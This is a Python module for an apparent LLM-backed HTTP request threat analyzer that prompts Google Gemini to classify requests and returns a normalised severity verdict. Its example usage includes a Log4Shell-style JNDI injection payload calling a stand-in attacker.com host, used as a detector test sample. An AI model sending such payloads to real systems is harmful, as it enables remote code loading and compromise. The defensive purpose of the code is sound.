# ai_engine.py - Tier 2: LLM-based Semantic Analysis
import json
import os
from typing import Dict, Optional
import httpx
from datetime import datetime
from dotenv import load_dotenv
import asyncio
import logging

# Load environment variables from .env file
load_dotenv()

logger = logging.getLogger(__name__)

class AISecurityAnalyzer:
    """
    Tier 2 Analysis: LLM-based semantic analysis for ambiguous requests
    Uses Google Gemini to detect Zero-Day logic flaws and polyglot attacks
    """
    
    # Using Google Gemini API (free tier available)
    MODEL = "gemini-2.0-flash"  # Latest available model
    MAX_TOKENS = 500
    TEMPERATURE = 0.2  # Low temperature for consistent, focused analysis
    
    SYSTEM_PROMPT = """You are an expert cybersecurity analyst specializing in Zero-Day vulnerability detection.
Analyze HTTP requests for potential exploit attempts, focusing on:
- Unusual logic flows and obfuscation techniques
- Polyglot payloads (multiple interpretation layers)
- Encoding tricks and bypasses (unicode, hex, base64, etc)
- Template injection and expression language attacks
- Prototype pollution and object manipulation
- Unusual API usage patterns

Provide analysis in strict JSON format with the fields specified."""
    
    def __init__(self, api_key: Optional[str] = None):
        """Initialize with Google Gemini API key"""
        self.api_key = api_key or os.getenv('GOOGLE_API_KEY')
        if not self.api_key:
            raise ValueError("Google API key not found. Set GOOGLE_API_KEY environment variable.")
        
        # Google Gemini API endpoint (using v1, not v1beta)
        self.base_url = "https://generativelanguage.googleapis.com/v1/models"
        self.client = httpx.AsyncClient(timeout=30.0)
        self.request_count = 0
        self.total_tokens_used = 0
    
    def _build_analysis_prompt(self, request_data: Dict) -> str:
        """Build the user prompt for LLM analysis"""
        return f"""Analyze this HTTP request for potential security exploits:

METHOD: {request_data.get('method', 'GET')}
PATH: {request_data.get('path', '/')}
USER_AGENT: {request_data.get('headers', {}).get('user-agent', 'N/A')}
CLIENT_IP: {request_data.get('client_ip', 'N/A')}
RESPONSE_STATUS: {request_data.get('response_status', 200)}
RESPONSE_TIME_MS: {request_data.get('response_time_ms', 0)}

REQUEST_BODY_PREVIEW:
{request_data.get('request_body_preview', '(empty)')}

ANALYSIS_QUESTIONS:
1. Is this request attempting to exploit a vulnerability?
2. Does it show signs of Zero-Day logic flaws or novel attack techniques?
3. Are there any encoding tricks, obfuscation, or polyglot patterns?
4. What is the likelihood this is a malicious request (0-100%)?

Respond ONLY with valid JSON in this exact format:
{{
  "severity": <0-10 integer>,
  "threat_type": "<classification>",
  "confidence": <0.0-1.0 float>,
  "is_zerodday": <true/false>,
  "attack_vectors": ["<vector1>", "<vector2>"],
  "reasoning": "<brief explanation>",
  "recommended_action": "block|investigate|monitor|allow",
  "indicators": ["<indicator1>", "<indicator2>"],
  "cve_reference": ["<cve_or_none>"]
}}"""
    
    async def analyze(self, request_data: Dict) -> Dict:
        """
        Send request to Google Gemini for security analysis
        Returns AI verdict with severity and reasoning
        Implements exponential backoff for rate limiting (429 errors)
        """
        self.request_count += 1
        
        # Retry configuration
        max_retries = 3
        initial_delay = 2  # Start with 2 seconds
        
        for attempt in range(max_retries):
            try:
                user_prompt = self._build_analysis_prompt(request_data)
                
                # Call Google Gemini API using REST endpoint
                headers = {
                    "Content-Type": "application/json"
                }
                
                payload = {
                    "contents": [
                        {
                            "role": "user",
                            "parts": [
                                {"text": f"{self.SYSTEM_PROMPT}\n\n{user_prompt}"}
                            ]
                        }
                    ],
                    "generationConfig": {
                        "maxOutputTokens": self.MAX_TOKENS,
                        "temperature": self.TEMPERATURE
                    }
                }
                
                # Use API key in URL for authentication
                url = f"{self.base_url}/{self.MODEL}:generateContent?key={self.api_key}"
                
                response = await self.client.post(url, headers=headers, json=payload)
                
                # Handle rate limiting with exponential backoff
                if response.status_code == 429:
                    if attempt < max_retries - 1:
                        delay = initial_delay * (2 ** attempt)  # 2, 4, 8 seconds
                        logger.warning(f"Rate limited (429). Retry {attempt + 1}/{max_retries - 1} after {delay}s delay")
                        await asyncio.sleep(delay)
                        continue
                    else:
                        logger.warning(f"Rate limited after {max_retries} attempts. Returning conservative result.")
                        return {
                            'severity': 3,
                            'threat_type': 'API_RATE_LIMITED',
                            'confidence': 0,
                            'reasoning': 'Gemini API rate limited - use Tier 1 assessment',
                            'recommended_action': 'investigate',
                            'error': 'Rate limited'
                        }
                
                if response.status_code != 200:
                    error_detail = response.text
                    return {
                        'severity': 3,  # Be conservative on API errors
                        'threat_type': 'API_ERROR',
                        'confidence': 0,
                        'reasoning': f'LLM analysis failed: {error_detail[:100]}',
                        'recommended_action': 'investigate',
                        'error': error_detail
                    }
                
                result = response.json()
                
                # Extract text from Gemini response
                try:
                    ai_response = result['candidates'][0]['content']['parts'][0]['text']
                except (KeyError, IndexError) as e:
                    return {
                        'severity': 2,
                        'threat_type': 'PARSE_ERROR',
                        'confidence': 0,
                        'reasoning': f'Failed to parse Gemini response: {str(e)}',
                        'recommended_action': 'investigate'
                    }
                
                # Try to extract JSON from response
                try:
                    ai_analysis = json.loads(ai_response)
                except json.JSONDecodeError:
                    # If response is not pure JSON, try to extract JSON object
                    import re
                    json_match = re.search(r'\{.*\}', ai_response, re.DOTALL)
                    if json_match:
                        ai_analysis = json.loads(json_match.group())
                    else:
                        return self._fallback_analysis(ai_response)
                
                # Estimate tokens (Gemini doesn't expose token counts in free tier)
                # Rough estimation: ~4 chars per token
                self.total_tokens_used += len(ai_response) // 4
                
                logger.info(f"Tier 2 analysis successful (attempt {attempt + 1})")
                
                # Validate and normalize response
                return self._normalize_ai_response(ai_analysis)
                
            except asyncio.TimeoutError:
                if attempt < max_retries - 1:
                    delay = initial_delay * (2 ** attempt)
                    logger.warning(f"Timeout. Retry {attempt + 1}/{max_retries - 1} after {delay}s delay")
                    await asyncio.sleep(delay)
                    continue
            except Exception as e:
                logger.error(f"Attempt {attempt + 1} failed: {str(e)}")
                if attempt == max_retries - 1:
                    return {
                        'severity': 2,
                        'threat_type': 'ANALYSIS_ERROR',
                        'confidence': 0,
                        'reasoning': f'Unexpected error after {max_retries} attempts: {str(e)}',
                        'recommended_action': 'monitor',
                        'error': str(e)
                    }
                await asyncio.sleep(initial_delay * (2 ** attempt))
                continue
        
        # Fallback if all retries exhausted
        return {
            'severity': 2,
            'threat_type': 'ANALYSIS_FAILED',
            'confidence': 0,
            'reasoning': 'All API attempts failed',
            'recommended_action': 'monitor'
        }
    
    def _normalize_ai_response(self, ai_response: Dict) -> Dict:
        """Normalize and validate AI response structure"""
        return {
            'severity': min(10, max(0, int(ai_response.get('severity', 0)))),
            'threat_type': ai_response.get('threat_type', 'UNKNOWN'),
            'confidence': min(1.0, max(0.0, float(ai_response.get('confidence', 0.5)))),
            'is_zerodday': ai_response.get('is_zerodday', False),
            'attack_vectors': ai_response.get('attack_vectors', []),
            'reasoning': ai_response.get('reasoning', 'No reasoning provided'),
            'recommended_action': ai_response.get('recommended_action', 'monitor'),
            'indicators': ai_response.get('indicators', []),
            'cve_reference': ai_response.get('cve_reference', [])
        }
    
    def _fallback_analysis(self, response: str) -> Dict:
        """Fallback analysis when API response parsing fails"""
        # Conservative analysis based on response length and content
        severity = 2
        if 'attack' in response.lower() or 'exploit' in response.lower():
            severity = 5
        if 'zerodday' in response.lower() or 'zero-day' in response.lower():
            severity = 8
        
        return {
            'severity': severity,
            'threat_type': 'ANALYSIS_UNCERTAIN',
            'confidence': 0.3,
            'reasoning': f'LLM response parsing failed. Response: {response[:100]}...',
            'recommended_action': 'investigate',
            'raw_response': response
        }
    
    def get_stats(self) -> Dict:
        """Get usage statistics for cost tracking"""
        # Google Gemini free tier: No cost (up to 60 requests/minute)
        # Paid tier (if needed): $0.00075 per 1000 input tokens, $0.0003 per 1000 output tokens
        # For free tier, cost is always $0
        estimated_cost = 0.0  # Free tier
        
        return {
            'requests_analyzed': self.request_count,
            'total_tokens_used': self.total_tokens_used,
            'estimated_cost_usd': estimated_cost,
            'avg_tokens_per_request': round(self.total_tokens_used / max(1, self.request_count), 1),
            'api_provider': 'Google Gemini (Free Tier)'
        }
    
    async def close(self):
        """Close HTTP client connection"""
        await self.client.aclose()


# Synchronous wrapper for easier use
class AISecurityAnalyzerSync(AISecurityAnalyzer):
    """Synchronous wrapper around async AI analyzer"""
    
    def analyze_sync(self, request_data: Dict) -> Dict:
        """Synchronous analysis (blocks until complete)"""
        import asyncio
        
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        return loop.run_until_complete(self.analyze(request_data))


# Example usage
if __name__ == '__main__':
    import asyncio
    
    async def test():
        analyzer = AISecurityAnalyzer()
        
        test_request = {
            'method': 'POST',
            'path': 'api/process',
            'request_body_preview': "{ 'data': '${jndi:ldap://attacker.com/...}' }",
            'headers': {'user-agent': 'Mozilla/5.0'},
            'client_ip': '203.0.113.45',
            'response_status': 200,
            'response_time_ms': 45
        }
        
        result = await analyzer.analyze(test_request)
        print(json.dumps(result, indent=2))
        print(f"\nStats: {analyzer.get_stats()}")
        
        await analyzer.close()
    
    asyncio.run(test())
